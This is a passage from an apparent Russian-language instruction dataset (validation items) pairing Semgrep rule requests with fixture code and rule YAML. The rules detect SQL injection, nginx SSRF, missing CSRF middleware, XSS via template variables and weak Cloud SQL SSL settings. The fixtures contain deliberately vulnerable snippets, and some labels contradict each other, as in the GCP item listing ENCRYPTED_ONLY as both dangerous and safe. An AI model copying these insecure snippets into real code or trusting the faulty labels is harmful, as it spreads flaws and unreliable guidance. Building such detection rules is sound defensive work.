    "output": "rules:\n- id: string-formatted-query\n  languages: [go]\n  message: >-\n    String-formatted SQL query detected. This could lead to SQL injection if\n    the string is not sanitized properly. Audit this call to ensure the\n    SQL is not manipulable by external data.\n  severity: WARNING\n  metadata:\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    source-rule-url: https://github.com/securego/gosec\n    category: security\n    technology:\n    - go\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n  patterns:\n  - metavariable-regex:\n        metavariable: $OBJ\n        regex: (?i).*(db|database)\n  - pattern-not-inside: |\n      $VAR = \"...\" + \"...\"\n      ...\n      $OBJ.$SINK(..., $VAR, ...)\n  - pattern-not: $OBJ.Exec(\"...\")\n  - pattern-not: $OBJ.ExecContext($CTX, \"...\")\n  - pattern-not: $OBJ.Query(\"...\")\n  - pattern-not: $OBJ.QueryContext($CTX, \"...\")\n  - pattern-not: $OBJ.QueryRow(\"...\")\n  - pattern-not: $OBJ.QueryRow($CTX, \"...\")\n  - pattern-not: $OBJ.QueryRowContext($CTX, \"...\")\n  - pattern-either:\n    - pattern: $OBJ.Exec($X + ...)\n    - pattern: $OBJ.ExecContext($CTX, $X + ...)\n    - pattern: $OBJ.Query($X + ...)\n    - pattern: $OBJ.QueryContext($CTX, $X + ...)\n    - pattern: $OBJ.QueryRow($X + ...)\n    - pattern: $OBJ.QueryRow($CTX, $X + ...)\n    - pattern: $OBJ.QueryRowContext($CTX, $X + ...)\n    - pattern: $OBJ.Exec(fmt.$P(\"...\", ...))\n    - pattern: $OBJ.ExecContext($CTX, fmt.$P(\"...\", ...))\n    - pattern: $OBJ.Query(fmt.$P(\"...\", ...))\n    - pattern: $OBJ.QueryContext($CTX, fmt.$P(\"...\", ...))\n    - pattern: $OBJ.QueryRow(fmt.$P(\"...\", ...))\n    - pattern: $OBJ.QueryRow($CTX, fmt.$U(\"...\", ...))\n    - pattern: $OBJ.QueryRowContext($CTX, fmt.$P(\"...\", ...))\n    - patterns:\n        - pattern-either:\n            - pattern: $QUERY = fmt.Fprintf($F, \"$SQLSTR\", ...)\n            - pattern: $QUERY = fmt.Sprintf(\"$SQLSTR\", ...)\n            - pattern: $QUERY = fmt.Printf(\"$SQLSTR\", ...)\n            - pattern: $QUERY = $X + ...\n        - pattern-either:\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.Query($QUERY, ...)\n                    ...\n                }\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.ExecContext($CTX, $QUERY, ...)\n                    ...\n                }\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.Exec($QUERY, ...)\n                    ...\n                }\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.QueryRow($CTX, $QUERY)\n                    ...\n                }\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.QueryRow($QUERY)\n                    ...\n                }\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.QueryContext($CTX, $QUERY)\n                    ...\n                }\n            - pattern-inside: |\n                func $FUNC(...) {\n                    ...\n                    $OBJ.QueryRowContext($CTX, $QUERY, ...)\n                    ...\n                }\n                \n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска строковых форматированных запросов SQL, которые могут привести к инъекции SQL при недостаточной их обработке. Анализ выполняется путем поиска вызовов методов Exec, Query и QueryRow объектов базы данных, таких как sql.DB или pgx.Conn, где строка запроса формируется динамически через конкатенацию строк или функции форматирования, такие как fmt.Sprintf, fmt.Printf и fmt.Fprintf. Правило также учитывает случаи, когда запрос передается внутрь функций, определенных пользователем, используя шаблон inside function.\n\n# Ключевые элементы:\n- ID: string-formatted-query\n- Язык: go \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "string-formatted-query",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: missing-internal\nОписание уязвимости: This location block contains a 'proxy_pass' directive but does not contain the 'internal' directive. The 'internal' directive restricts access to this location to internal requests. Without 'internal', an attacker could use your server for server-side request forgeries (SSRF). Include the 'internal' directive in this block to limit exposure.\nCWE: CWE-16: CWE CATEGORY: Configuration\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-16: CWE CATEGORY: Configuration\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: missing-internal.conf\nserver {\n    location ~ /proxy/(.*)/(.*)/(.*)$ {\n        # ruleid: missing-internal\n        proxy_pass $1://$2/$3;\n    }\n}\n\nserver {\n    location / {\n        # ok: missing-internal\n        proxy_pass http://127.0.0.1:8000/;\n    }\n}\n\nserver {\n    location ~ /proxy/(.*)/(.*)/(.*)$ {\n        internal;\n        # ok: missing-internal\n        proxy_pass $1://$2/$3;\n    }\n}\n\nserver {\n    location / {\n        # ok: missing-internal\n        proxy_pass  http:/backend:42/;\n        set         $false  'positive';\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• location ~ /proxy/(.*)/(.*)/(.*)$ {\n    # ruleid: missing-internal\n    proxy_pass $1://$2/$3;\n}\n• location ~ /(.*)/foo/bar/(.*) {\n    proxy_pass $1://$2;\n    # ruleid: missing-internal\n}\n• location /bar/baz/\n{\n    proxy_pass http://example.com; \n    # ruleid: missing-internal\n}\n\nБезопасные паттерны:  \n• location ~ /proxy/(.*)/(.*)/(.*)$ {\n    internal;\n    # ok: missing-internal\n    proxy_pass $1://$2/$3;\n}\n• location /foo/bar/\n{\n    internal;\n    proxy_pass http://example.com;\n}\n• location ~ /(.*)/foo/bar/(.*) {\n    internal;\n    proxy_pass $1://$2;\n}\n\nЛегенда аннотаций:\n- // ruleid:missing-internal: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-internal: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: missing-internal\n  options:\n    generic_ellipsis_max_span: 0\n    generic_engine: aliengrep\n  patterns:\n    - pattern-inside: |\n        location ... {\n          ....\n          ....\n        }\n    - pattern-not-inside: |\n        location ... {\n          ....\n          internal;\n          ....\n        }\n    - pattern: proxy_pass $...URL;\n    - metavariable-regex:\n        metavariable: $...URL\n        regex: (.*\\$.*)\n  paths:\n    include:\n    - '*.conf'\n    - '*.vhost'\n    - '**/sites-available/*'\n    - '**/sites-enabled/*'\n  languages:\n  - generic\n  severity: WARNING\n  message: >-\n    This location block contains a 'proxy_pass' directive but does not contain the 'internal'\n    directive. The 'internal' directive restricts access to this location to internal requests.\n    Without 'internal', an attacker could use your server for server-side request forgeries (SSRF).\n    Include the 'internal' directive in this block to limit exposure.\n  metadata:\n    cwe:\n    - 'CWE-16: CWE CATEGORY: Configuration'\n    references:\n    - https://github.com/yandex/gixy/blob/master/docs/en/plugins/ssrf.md\n    - https://nginx.org/en/docs/http/ngx_http_core_module.html#internal\n    category: security\n    technology:\n    - nginx\n    confidence: LOW\n    owasp:\n    - A06:2017 - Security Misconfiguration\n    - A05:2021 - Security Misconfiguration\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Nginx, где используется директива 'proxy_pass' без директивы 'internal'. Директива 'internal' ограничивает доступ к местоположению только внутренними запросами. Без нее сервер может быть использован злоумышленником для атак SSRF (Server-Side Request Forgery). Правило ищет блок 'location', содержащий 'proxy_pass', но не содержащий 'internal', используя механизм сопоставления внутри и снаружи блока.\n\n# Ключевые элементы:\n- ID: missing-internal\n- Язык: generic \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-internal",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: express-check-csurf-middleware-usage\nОписание уязвимости: A CSRF middleware was not detected in your express application. Ensure you are either using one such as `csurf` or `csrf` (see rule references) and/or you are properly doing CSRF validation in your routes with a token or cookies.\nCWE: CWE-352: Cross-Site Request Forgery (CSRF)\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-352: Cross-Site Request Forgery (CSRF)\n- Серьезность: INFO\n\nКонтекст кода:\n// File: express-check-csurf-middleware-usage.js\nvar cookieParser = require('cookie-parser') //for cookie parsing\n// var csrf = require('csurf') //csrf module\nvar bodyParser = require('body-parser') //for body parsing\n\nvar express = require('express')\n\n// setup route middlewares\nvar csrfProtection = csrf({\n    cookie: true\n})\nvar parseForm = bodyParser.urlencoded({\n    extended: false\n})\n\n// ruleid: express-check-csurf-middleware-usage\nvar app = express()\n\n// parse cookies\napp.use(cookieParser())\n\napp.get('/form', csrfProtection, function(req, res) {\n    // generate and pass the csrfToken to the view\n    res.render('send', {\n        csrfToken: req.csrfToken()\n    })\n})\n\napp.post('/process', parseForm, csrfProtection, function(req, res) {\n    res.send('data is being processed')\n})\n\napp.post('/bad', parseForm, function(req, res) {\n    res.send('data is being processed')\n})  # Ограничиваем длину\n\nОпасные паттерны:\n• var csrfProtection = csrf({}); // отсутствует вызов csrf-protection middleware\n• var csrfProtection = {}; // отсутствует защита от CSRF\n\nБезопасные паттерны:  \n• var csrfProtection = csrf({cookie: true}); // присутствует csrf-protection middleware\n• import {csrf} from 'csurf'; // используется альтернативная библиотека csurf\n\nЛегенда аннотаций:\n- // ruleid:express-check-csurf-middleware-usage: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:express-check-csurf-middleware-usage: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: express-check-csurf-middleware-usage\n  message: >-\n    A CSRF middleware was not detected in your express application. Ensure you are either using one such\n    as `csurf` or `csrf` (see rule references) and/or you are properly doing CSRF validation in\n    your routes with a token or cookies.\n  metadata:\n    category: security\n    references:\n    - https://www.npmjs.com/package/csurf\n    - https://www.npmjs.com/package/csrf\n    - https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html\n    cwe:\n    - 'CWE-352: Cross-Site Request Forgery (CSRF)'\n    owasp:\n    - A01:2021 - Broken Access Control\n    technology:\n    - javascript\n    - typescript\n    - express\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: INFO\n  patterns:\n  - pattern-inside: |\n      $EXPRESS = require('express')\n      ...\n  - pattern-not-inside: |\n      import {$CSRF} from 'csurf'\n      ...\n  - pattern-not-inside: |\n      require('csurf')\n      ...\n  - pattern-not-inside: | # filter out applications that use this alternate csrf library\n      import {$CSRF} from 'csrf'\n      ...\n  - pattern-not-inside: | # filter out applications that use this alternate csrf library\n      require('csrf')\n      ...\n  - pattern: |\n      $APP = $EXPRESS()\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска отсутствующего middleware защиты от CSRF в приложениях Express.js. Оно использует комбинацию операторов pattern-inside и pattern-not-inside для проверки наличия или отсутствия определенных модулей и функций, связанных с защитой от CSRF. Правило ищет выражение require('express'), за которым не следует явное включение модуля csurf или эквивалентной библиотеки. Также проверяется отсутствие импорта или вызова этих библиотек.\n\n# Ключевые элементы:\n- ID: express-check-csurf-middleware-usage\n- Язык: javascript \n- Тип: audit\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "express-check-csurf-middleware-usage",
      "language": "javascript",
      "severity": "INFO",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: i18next-key-format\nОписание уязвимости: Translation key '$KEY' should match format 'MODULE.FEATURE.*'\nCWE: \nТип анализа: search\nЯзык: typescript",
    "input": "Требования:\n- Язык: typescript\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: i18next-key-format.tsx\n// ruleid: i18next-key-format\nt('key', 'default value to show');\n\n// ruleid: i18next-key-format\ni18next.t('name');\n\n// from different namespace (not recommended with namespace prefix when used in combination with natural language keys)\n// ruleid: i18next-key-format\ni18next.t('common:button.save') // -> \"save\"\n// better use the ns option:\n// ruleid: i18next-key-format\ni18next.t('button.save', { ns: 'common' }) // -> \"save\"\n\n// const error = '404';\n// ruleid: i18next-key-format\nt([`error.${error}`, 'error.unspecific']); // -> \"The page was not found\"\n\n// const error = '502';\n// ruleid: i18next-key-format\ni18next.t([`error.${error}`, 'error.unspecific']); // -> \"Something went wrong\"\n\n// ruleid: i18next-key-format\ni18next.t('key', { what: 'i18next', how: 'great' });\n// ruleid: i18next-key-format\ni18next.t('keyEscaped', { myVar: '<img />' });\n// -> \"no danger &lt;img &#x2F;&gt;\"\n\n// ruleid: i18next-key-format\ni18next.t('keyUnescaped', { myVar: '<img />' });\n// -> \"dangerous <img />\"\n\n// ruleid: i18next-key-format\ni18next.t('keyEscaped', { myVar: '<img />', interpolation: { escapeValue: false } });\n// -> \"no danger <img />\" (obviously could be dangerous)\n\n// ruleid: i18next-key-format\ni18next.t('intlNumber', { val: 1000 });\n// --> Some 1,000\n// ruleid: i18next-key-format\ni18next.t('intlNumber', { val: 1000.1, minimumFractionDigits: 3 });\n// --> Some 1,000.100\n// ruleid: i18next-key-format\ni18next.t('intlNumber', { val: 1000.1, formatParams: { val: { minimumFractionDigits: 3 } } });\n// --> Some 1,000.100\n// ruleid: i18next-key-format\ni18next.t('intlNumberWithOptions', { val: 2000 });\n// --> Some 2,000.00\n// ruleid: i18next-key-format\ni18next.t('intlNumberWithOptions', { val: 2000, minimumFractionDigits: 3 });\n// --> Some 2,000.000\n\n\n// ok: i18next-key-format\ni18next.t('core.email.key', 'default value to show');\n\n// ok: i18next-key-format\ni18next.t('core.email.name');\n\n// from different namespace (not recommended with namespace prefix when u  # Ограничиваем длину\n\nОпасные паттерны:\n• t('key', 'default value to show');\n• i18next.t('name');\n• i18next.t('common:button.save') // -> \"save\"\n\nБезопасные паттерны:  \n• i18next.t('core.email.key', 'default value to show');\n• i18next.t('core.email.name');\n• i18next.t('core.email.button.save', { ns: 'common' }) // -> \"save\"\n\nЛегенда аннотаций:\n- // ruleid:i18next-key-format: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:i18next-key-format: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: i18next-key-format\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern-either:\n        - pattern: t('$KEY')\n        - pattern: t('$KEY', $OPTIONS)\n        - pattern: t([$DYNAMIC_KEY, '$KEY'])\n        - pattern: t([$DYNAMIC_KEY, '$KEY'], $OPTIONS)\n      - metavariable-regex:\n          metavariable: $KEY\n          regex: (?!^[a-z0-9-]+\\.[a-z0-9-]+\\.[a-zA-Z0-9_.-]+$)\n    - patterns:\n      - pattern-either:\n        - pattern: t([$DYNAMIC_KEY, '$KEY'])\n        - pattern: t([$DYNAMIC_KEY, '$KEY'], $OPTIONS)\n      - metavariable-regex:\n          metavariable: $DYNAMIC_KEY\n          regex: (?!^[`][a-z0-9-]+[.][a-z0-9-]+[.]\\S+$)\n    - patterns:\n      - pattern-either:\n        - pattern: $I18NEXT.t('$KEY')\n        - pattern: $I18NEXT.t('$KEY', $OPTIONS)\n        - pattern: $I18NEXT.t([$DYNAMIC_KEY, '$KEY'])\n        - pattern: $I18NEXT.t([$DYNAMIC_KEY, '$KEY'], $OPTIONS)\n      - metavariable-regex:\n          metavariable: $I18NEXT\n          regex: (^i18n|i18next$)\n      - metavariable-regex:\n          metavariable: $KEY\n          regex: (?!^[a-z0-9-]+\\.[a-z0-9-]+\\.[a-zA-Z0-9_.-]+$)\n    - patterns:\n      - pattern-either:\n        - pattern: $I18NEXT.t([$DYNAMIC_KEY, '$KEY'])\n        - pattern: $I18NEXT.t([$DYNAMIC_KEY, '$KEY'], $OPTIONS)\n      - metavariable-regex:\n          metavariable: $I18NEXT\n          regex: (^(i18n|i18next)$)\n      - metavariable-regex:\n          metavariable: $DYNAMIC_KEY\n          regex: (?!^[`][a-z0-9-]+[.][a-z0-9-]+[.]\\S+$)\n  message: Translation key '$KEY' should match format 'MODULE.FEATURE.*'\n  languages:\n  - typescript\n  - javascript\n  severity: WARNING\n  metadata:\n    category: portability\n    technology:\n    - react\n    - mui\n    - i18next\n    references:\n    - https://www.notion.so/hendyirawan/Internationalization-Localization-Policy-318c21674e5f44c48d6f136a6eb2e024\n    - https://mui.com/\n    - https://react.i18next.com/\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций t() и I18NEXT.t(), где ключи перевода ($KEY) не соответствуют требуемому формату 'MODULE.FEATURE.*'. Правило использует комбинацию шаблонов и регулярных выражений для проверки формата ключа. Шаблоны включают проверку наличия динамических ключей и параметров опций. Регулярные выражения используются для фильтрации недопустимых ключевых слов, таких как одиночные символы или ключевые слова, начинающиеся с символа `$`. Правило применимо к типам файлов TypeScript и JavaScript.\n\n# Ключевые элементы:\n- ID: i18next-key-format\n- Язык: typescript \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "i18next-key-format",
      "language": "typescript",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: gcp-sql-database-ssl-insecure-value-sqlserver\nОписание уязвимости: Ensure all Cloud SQL database instance require incoming connections to use SSL. For SQL Server, `ssl_mode=\"ENCRYPTED_ONLY\"` is the most secure value that is supported.\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-sql-database-ssl-insecure-value-sqlserver.fixed.tf\n# ok: gcp-sql-database-ssl-insecure-value-sqlserver\nresource \"google_sql_database_instance\" \"fail\" {\n  database_version = \"MYSQL_8_0\"\n  name             = \"instance\"\n  region           = \"us-central1\"\n  settings {\n    tier = \"db-f1-micro\"\n  }\n}\n\n# ok: gcp-sql-database-ssl-insecure-value-sqlserver\nresource \"google_sql_database_instance\" \"success\" {\n  database_version = \"MYSQL_8_0\"\n  name             = \"instance\"\n  region           = \"us-central1\"\n  ip_configuration {\n      ipv4_enabled = true\n      require_ssl = true\n  }\n}\n\nresource \"google_sql_database_instance\" \"main\" {\n  name      = \"some-example-name\"\n  database_version  = \"POSTGRES_15\"\n  region      = \"europe-west3\"\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      # ok: gcp-sql-database-ssl-insecure-value-sqlserver\n      ssl_mode = \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\"\n    }\n  }\n}\n\nresource \"google_sql_database_instance\" \"main\" {\n  name      = \"some-example-name\"\n  database_version  = \"POSTGRES_15\"\n  region      = \"europe-west3\"\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      # ok: gcp-sql-database-ssl-insecure-value-sqlserver\n      ssl_mode = \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\"\n    }\n  }\n}\n\nresource \"google_sql_database_instance\" \"main\" {\n  name      = \"some-example-name\"\n  database_version  = \"POSTGRES_15\"\n  region      = \"europe-west3\"\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      # ok: gcp-sql-database-ssl-insecure-value-sqlserver\n      ssl_mode = \"ENCRYPTED_ONLY\"\n    }\n  }\n}\n\nresource \"google_sql_database_instance\" \"main\" {\n  name      = \"some-example-name\"\n  database_version  = \"POSTGRES_15\"\n  region      = \"europe-west3\"\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      # ok: gcp-sql-database-ssl-insecure-value-sqlserver\n      ssl_mode = \"ALLOW_UNENCRYPTED_AND_ENCRYPTED\"\n    }\n  }\n}\n\nresource \"google_sql_database_instance\" \"mysql_fail\" {\n  database_version = \"MYSQL_8  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_sql_database_instance\" \"sqlserver_fail\" { ... ssl_mode = \"ALLOW_UNENCRYPTED_AND_ENCRYPTED\" }\n• resource \"google_sql_database_instance\" \"sqlserver_fail\" { ... ip_configuration { ssl_mode = \"ENCRYPTED_ONLY\" } }\n\nБезопасные паттерны:  \n• resource \"google_sql_database_instance\" \"sqlserver_success\" { ... ip_configuration { ssl_mode = \"ENCRYPTED_ONLY\" } }\n• resource \"google_sql_database_instance\" \"mysql_success\" { ... ip_configuration { ssl_mode = \"ENCRYPTED_ONLY\" } }\n\nЛегенда аннотаций:\n- // ruleid:gcp-sql-database-ssl-insecure-value-sqlserver: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-sql-database-ssl-insecure-value-sqlserver: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-sql-database-ssl-insecure-value-sqlserver\n  patterns:\n  - pattern-inside: |\n      resource \"google_sql_database_instance\" \"...\" {\n          ...\n          database_version = \"$DB\"\n          ...\n      }\n  - pattern-inside: |\n      resource \"google_sql_database_instance\" \"...\" {\n          ...\n          ip_configuration {\n              ...\n              ssl_mode = $VALUE\n              ...\n          }\n          ...\n      }\n  - pattern-not-inside: |\n      resource \"google_sql_database_instance\" \"...\" {\n          ...\n          ip_configuration {\n              ...\n              ssl_mode = \"ENCRYPTED_ONLY\"\n              ...\n          }\n          ...\n      }\n  - metavariable-regex:\n      metavariable: $DB\n      regex:  .*(SQLSERVER).*\n  - focus-metavariable: $VALUE\n  fix: |\n    \"ENCRYPTED_ONLY\"\n  message: >-\n    Ensure all Cloud SQL database instance require incoming connections to use SSL. For SQL Server, `ssl_mode=\"ENCRYPTED_ONLY\"` is the most secure value that is supported.\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - \"https://cloud.google.com/sql/docs/postgres/admin-api/rest/v1/instances#ipconfiguration\"\n    - \"https://owasp.org/Top10/A02_2021-Cryptographic_Failures\"\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: WARNING\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Cloud SQL Database Instance, где атрибут ssl_mode не установлен в значение 'ENCRYPTED_ONLY' для SQL Server баз данных. Анализ выполняется путем проверки наличия ресурса google_sql_database_instance с атрибутом ssl_mode внутри блока ip_configuration. Правило также исключает случаи, когда ssl_mode уже установлен в безопасное значение 'ENCRYPTED_ONLY'. Использование регулярных выражений позволяет ограничить проверку только для SQL Server баз данных.\n\n# Ключевые элементы:\n- ID: gcp-sql-database-ssl-insecure-value-sqlserver\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-sql-database-ssl-insecure-value-sqlserver",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: var-in-script-tag\nОписание уязвимости: Detected a template variable used in a script tag. Although template variables are HTML escaped, HTML escaping does not always prevent cross-site scripting (XSS) attacks when used directly in JavaScript. If you need this data on the rendered page, consider placing it in the HTML portion (outside of a script tag). Alternatively, use a JavaScript-specific encoder, such as the one available in OWASP ESAPI. For Django, you may also consider using the 'json_script' template tag and retrieving the data in your script by using the element ID (e.g., `document.getElementById`).\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: var-in-script-tag.html\n<!DOCTYPE html>\n<html>\n    <head></head>\n    <body>\n        <script>\n            // ruleid: var-in-script-tag\n            const mydata = {{ mydata_json|safe }};\n            // ruleid: var-in-script-tag\n            const moredata = {{ mydata_json }};\n        </script>\n        <div>\n            <!-- ok: var-in-script-tag -->\n            <p>{{ this_is_fine }}</p>\n        </div>\n    </body>\n\n    <!-- ok: var-in-script-tag -->\n    <script src=\"./{{ reactDemoIndexBundleJs }}\" crossOrigin=\"anonymous\" integrity=\"{{ sri.reactDemoIndexBundleJs }}\"></script>\n\n</html>\n\n\n// File: var-in-script-tag.mustache\n<!-- cf. https://github.com/caiomartini/mustache-demo/blob/97b9200ebd2d27953febff23e6718aa1aa9ee44d/demo-mustache.html -->\n<!DOCTYPE HTML>\n<html>\n\n<head>\n    <title>Demo Mustache.JS</title>\n    <meta charset=\"utf-8\">\n    <link rel=\"stylesheet\" href=\"node_modules\\bootstrap\\dist\\css\\bootstrap.min.css\">\n    <script type=\"text/javascript\" src=\"node_modules\\jquery\\dist\\jquery.min.js\"></script>\n    <script type=\"text/javascript\" src=\"node_modules\\bootstrap\\dist\\js\\bootstrap.min.js\"></script>\n    <script type=\"text/javascript\" src=\"node_modules\\mustache\\mustache.min.js\"></script>\n    <script type=\"text/javascript\" src=\"demo-mustache.js\"></script>\n</head>\n\n<body onload=\"carregarDemo();\">\n    <div class=\"content\">\n        <div id=\"mustache-header\"></div>\n        <div id=\"mustache-cards\"></div>\n    </div>\n</body>\n\n<script type=\"text/javascript\">\n    <!-- ruleid: var-in-script-tag -->\n    var message = {{ message }};\n</script>\n\n<script type=\"text/javascript\">\n    <!-- ruleid: var-in-script-tag -->\n    var message = {{ message }};\n    console.log(message);\n    console.log(\"more statements here\");\n    <!-- ruleid: var-in-script-tag -->\n    var message2 = {{ message2 }};\n    var flash = document.getElementById(\"flash\");\n    flash.text = message;\n</script>\n\n<script type=\"text/javascript\" src=\"mustache.js\"></script>\n<!-- ok: var-in-script-tag -->\n{{ message }}\n  # Ограничиваем длину\n\nОпасные паттерны:\n• <script>const mydata = {{ mydata_json|safe }};</script>\n• <script>var message = {{ message }};</script>\n• <script>var message2 = {{ message2 }};var flash = document.getElementById(\"flash\");flash.text = message;</script>\n\nБезопасные паттерны:  \n• <div><p>{{ this_is_fine }}</p></div>\n• <script type=\"text/javascript\" src=\"./{{ reactDemoIndexBundleJs }}\" crossOrigin=\"anonymous\" integrity=\"{{ sri.reactDemoIndexBundleJs }}\"></script>\n• {{ message }}\n\nЛегенда аннотаций:\n- // ruleid:var-in-script-tag: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:var-in-script-tag: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: var-in-script-tag\n  message: >-\n    Detected a template variable used in a script tag.\n    Although template variables are HTML escaped, HTML\n    escaping does not always prevent cross-site scripting (XSS)\n    attacks when used directly in JavaScript.\n    If you need this data on the rendered page, consider placing it in the HTML\n    portion (outside of a script tag).\n    Alternatively, use a JavaScript-specific encoder, such as the one available\n    in OWASP ESAPI.\n    For Django, you may also consider using the 'json_script' template tag and\n    retrieving the data in your script by using the element ID (e.g., `document.getElementById`).\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://adamj.eu/tech/2020/02/18/safely-including-data-for-javascript-in-a-django-template/?utm_campaign=Django%2BNewsletter&utm_medium=rss&utm_source=Django_Newsletter_12A\n    - https://www.veracode.com/blog/secure-development/nodejs-template-engines-why-default-encoders-are-not-enough\n    - https://github.com/ESAPI/owasp-esapi-js\n    category: security\n    technology:\n    - html-templates\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n  languages:\n  - generic\n  paths:\n    include:\n    - '*.mustache'\n    - '*.hbs'\n    - '*.html'\n  severity: WARNING\n  patterns:\n  - pattern-inside: <script ...> ... </script>\n  - pattern-not-inside: <script ... $ATTR = \"...\" ...>\n  - pattern-not-inside: <script ... $ATTR = '...' ...>\n  - pattern: '{{ ... }}'\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования переменных шаблонов внутри тегов скриптов (<script>). Переменные шаблонов обычно подвергаются HTML-экранированию, но при прямом использовании в JavaScript это не всегда предотвращает атаки XSS. Правило использует комбинацию операторов pattern-inside и pattern-not-inside для ограничения области поиска внутри тегов скрипта и исключения случаев, когда атрибуты скрипта содержат текстовые значения. Шаблон {{ ... }} используется для идентификации переменных шаблона.\n\n# Ключевые элементы:\n- ID: var-in-script-tag\n- Язык: generic \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "var-in-script-tag",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: gcp-sql-database-require-ssl\nОписание уязвимости: Ensure all Cloud SQL database instance requires all incoming connections to use SSL\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: hcl",
